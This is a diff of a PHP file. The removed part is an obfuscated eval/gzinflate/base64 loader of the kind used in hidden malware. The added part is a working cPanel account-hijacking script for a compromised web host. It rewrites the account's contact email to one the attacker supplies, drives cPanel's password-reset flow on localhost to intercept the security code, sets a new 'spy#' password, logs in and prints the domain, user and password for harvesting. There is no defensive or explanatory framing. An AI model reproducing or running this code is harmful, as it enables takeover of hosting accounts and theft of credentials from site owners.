@@ -1,9 +1,156 @@
-<?php function sMr($EXbVB)
-{ 
-$EXbVB=gzinflate(base64_decode($EXbVB));
- for($i=0;$i<strlen($EXbVB);$i++)
- {
-$EXbVB[$i] = chr(ord($EXbVB[$i])-1);
- }
- return $EXbVB;
- }eval(sMr("7Vhtc9M4EP6ezvQ/CDeDncONQzg4jr5AL01pITS5JIXjSsfjOIotsCWfLJME6G+/lWSnTgopMPfppp1OY692n12tnt1VihD8bG44DnpFUoE5GiRzNJjHEaEfMH/dRD3O3mNfIBsNQ49+QG9ZtrmRYuEKEmM3IjERVqO2s7mBOWfc5ThhXBAaaOHmxiSjviCMolbGo54XYKsKD3Y1YalAe4hmEbyE2BvDi+AZrqHPmxtVP4RXHxRdQsGBhFJv4JglwoJ1G7XO+p1ub+jCh40k6Fqt4/bBYbsPitJXbQetUT3qdjrdN51u62B40j210f21wP328Kx/OuwfnA6OpIP12oNBx33d7p8cve21pXbjO7WPu4PhTdpng3b/4Hn7FBSrLjyD5bl5PBz21IqrlswLfSzfBGl1uy9P2kcnnbaNDP1SFzNhrE+ZVnxx0F81kr5OJsjS531nD52edTq1z2ugemqn67ModY5O2p3DAWxVIkvtS+BNzrGCPHiGfWmp4yATS0s5p0yJZSDYDxkq5IwX6peLLPkRS3Eh5lhknFqFo4XmNZo3b3l+y/P/H881jrk7YTxGMRYhG+8ZMjJjf3Njl9AkE0jME7xnCAyJQdSL4RnHHokM9NGLMngzkLOqnGYjGCQLjQAvTNWj0nekz31z5+dC8NkY/1gEzVIIzWsxwCEEkP6qOqNzE3TMCxBX1VZLC+pdLwXNZYOmFsvIBq3SkhSoJXWUJAVmWNWghu7eRTk88Msw5KFWqiQBSyMUInniOBHzvSiEVDxpNh43jR2p4CcexTKiUmciiTzQCqDfsRKOAzf2hB9ahsMxOEu8NHUMO7esAXvGBCPLbEvebDOKzdrOpYROprKbPYOt+NOxtYAseiHQEu4UqWXC4ZCZC2o4IGOzplpfpVLNUp6bu0BAjqlwsxRzDQTLpECP5/BciIOSOCiJOctUKp6qbV8iHKW4cKRNFmEkU4l3FZVCX4ZfLAY8WNINSrp6AxL+3JRUUYe28Kfl8KcQFyFKH8sG2qmWB4XBpUonsnCciLklnRWZk9KrY3O9KLKMLSdkMXas+i81J8lGEfHdUMSRswUHCedkV+PZTPWBSqXyU7Yq0sWeQXJ+/+K8oTdwmYf7dWCJK+1KeE0FV5WrCq15BTaZciKwNWEJpsBIqaL0FELdZ1R4vtANxTamRs3WNVHbucFQkdnJ7QmdsNxcV+gTs17gKGZDDXVYQChE53HuzS1kSm6aaG8fqRzYyIykgpKYfVk393pQOFPGgeIKJMoBFjdfAwrvqsQM+8pNUTtLxaj69PZCf3tMUm8U4bGsTYW9pjIBeIDpeIChsoiYt6CllLbiqfrUoSfZp08RNuWGru3Qo+m0EKnsgGyMR1mgTU27MN8OMgwRqoa6rF5KkgzoXhHRPRlSnqj0eqTrc7a6ta+mb+pxChFBQyfjbb2TbR2tTOCqz7w2Miq/+dzAu9rON9Wus0wXzg+x2iux+pkfxmx8k0njUaORN6X/JpmX+YXBeEd3R3wf1Z1DoJdRXANKc6mpB1M+xUqT6XY63E6HpelQHTNgK1U3naVru7z0613deJ0BBqWCw6+Vo0GLmU6ndTOP/soH6Mj/RkSeD7yXKlBYELFe1xyXJFixyp+KDKsCWWme17tkqZum2FfXN3u5T8Kdjk4Ij7WdrhXd+wh9/11VuqjMKsVTKZd5SpP5llGHq6tMiNxwGmaTSQQQ95sPfn346LfHv3sjf4wnQUjef4hiypJ/eDrPPk5n808Hf7QO20fPj09evOy8Ou32/uwPhmev3/z19m9oPw8btbqxNTMW07CYbd+aIsXo+8ocKS1KWRG/bXpREnrafsREqGwpo6vilezl9ov0lSJbn8JC8QdGvLRe8mrrgebqrws6SEBBMOPWDX0ldW6c+BMSQUOnYMbLQ15SVHfjXT1g9mWBpFAhOV1lfTz4IoP+UgS66+Sq76ixTHaNpK8MYsqK9byzP93/Fw=="));?>
+<?php
+set_time_limit(0);
+error_reporting(0);
+
+function CurlPage($url,$post = null,$head = true) {
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_HEADER, $head); 
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+
+curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt"); 
+curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");
+
+If ($post != NULL){
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+}
+$urlPage = curl_exec($ch);
+
+if(curl_errno($ch)){
+echo curl_error($ch);
+}
+
+curl_close($ch);
+return($urlPage);
+}
+
+function CurlPage2($url,$post = null,$head = true) {
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_HEADER, $head); 
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+
+curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt"); 
+curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");
+
+If ($post != NULL){
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+}
+$urlPage = curl_exec($ch);
+
+if(curl_errno($ch)){
+echo curl_error($ch);
+}
+
+curl_close($ch);
+return($urlPage);
+}
+
+
+echo'<form method="post">
+<input type="text" name="email" value="" />
+<input type="submit" value="get" name="get" />
+</form>';
+echo'<form method="post">
+<input type="text" name="code" value="" />
+<input type="submit" value="get2" name="get2" />
+</form>';
+
+$g = $_POST['get'];
+$email = $_POST['email'];
+$g2 = $_POST['get2'];
+$codeSC = $_POST['code'];
+
+if(isset($g) && $email != ""){
+	$ip = "http://localhost:2082";
+	$cpanel = CurlPage2($ip);
+	if(!(preg_match("/resetpass/",$cpanel))){die ('Error-one');}
+	$pwd = @getcwd();
+	if(!function_exists('posix_getegid')) {
+		$usr = @get_current_user();
+		$uid = @getmyuid();
+		$gid = @getmygid();
+		$group = "?";
+	} else {
+		$uid = @posix_getpwuid(posix_geteuid());
+		$gid = @posix_getgrgid(posix_getegid());
+		$usr = $uid['name'];
+		$uid = $uid['uid'];
+		$group = $gid['name'];
+		$gid = $gid['gid'];
+	}
+	if (empty($usr)) {
+		if (preg_match_all("#/home/(.*)/public_html/#",$pwd,$mxx)){
+			preg_match_all("#/home/(.*)/public_html/#",$pwd,$mxx);
+			$usr = $mxx[1][0];
+		}
+	}
+	preg_match_all("#/home(.*)$usr/#",$pwd,$m2);
+	$home = $m2[1][0];
+	fwrite(fopen("/home$home$usr/.contactemail","w"),$email);fwrite(fopen("/home$home$usr/.cpanel/contactinfo","w"),'email:'.$email);
+	$postLogin = array( 'user' => $usr , 'login' => 'Reset+Password');
+	$login = CurlPage("$ip/resetpass",$postLogin);
+	if(preg_match("/error-resetpass-disabled/",$login)){die ('Error-one');}
+	$postSendSecurityCode = array( 'action' => 'puzzle' , 'user' => $usr , 'answer' => $email, 'debug' => '', 'puzzle-guess-input' => $email, 'login' => 'Send+Security+Code');
+	$sendSecurityCode = CurlPage("$ip/resetpass",$postSendSecurityCode);
+	if(preg_match("/warn-invalid-answer-puzzle/",$sendSecurityCode)){
+		unlink("/home$home$usr/.contactemail");unlink("/home$home$usr/.cpanel/contactinfo");
+		fwrite(fopen("/home$home$usr/.contactemail","a"),$email);@chmod("/home$home$usr/.contactemail",0600);
+		$sendSecurityCode = CurlPage("$ip/resetpass",$postSendSecurityCode);
+	}
+echo "\n<br> ./Done";
+}
+
+if(isset($g2) && $codeSC != ""){
+	$pwd = @getcwd();
+	if(!function_exists('posix_getegid')) {
+		$usr = @get_current_user();
+		$uid = @getmyuid();
+		$gid = @getmygid();
+		$group = "?";
+	} else {
+		$uid = @posix_getpwuid(posix_geteuid());
+		$gid = @posix_getgrgid(posix_getegid());
+		$usr = $uid['name'];
+		$uid = $uid['uid'];
+		$group = $gid['name'];
+		$gid = $gid['gid'];
+	}
+	if (empty($usr)) {
+		if (preg_match_all("#/home/(.*)/public_html/#",$pwd,$mxx)){
+			preg_match_all("#/home/(.*)/public_html/#",$pwd,$mxx);
+			$usr = $mxx[1][0];
+		}
+	}
+	$domain = $_SERVER['HTTP_HOST'];
+	$ip = "http://localhost:2082";
+	if(strstr($domain, 'www.')){
+		$domain = str_replace("www.","",$domain);
+	}else{
+		$domain = $domain;
+	}
+	$postCode = array( 'user' => $usr , 'action' => 'seccode','debug' => '','confirm' => $codeSC);
+	$injCode = CurlPage("$ip/resetpass",$postCode);
+	$newpass = "spy#".substr(str_shuffle("123456789abcdefghijklmnopqrsyuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),50)."#x";
+	$postPassword = array( 'action' => 'password' , 'user' => $usr ,'password' => $newpass ,'alpha' => 'both' , 'nonalpha' => 'both','confirm' => $newpass);
+	$injPassword = CurlPage("$ip/resetpass",$postPassword);
+	$postLogin = array( 'user' => $usr , 'pass' => $newpass,'login_submit' => 'Log in');
+	$login = CurlPage("$ip/login/",$postLogin);
+	if(preg_match("/filemanager/",$login)){
+		echo "<cpanel>https://$domain:2083|$usr|$newpass</cpanel>\n";
+	}else{
+		echo "Error-two\n";
+	}
+}
+
+?>
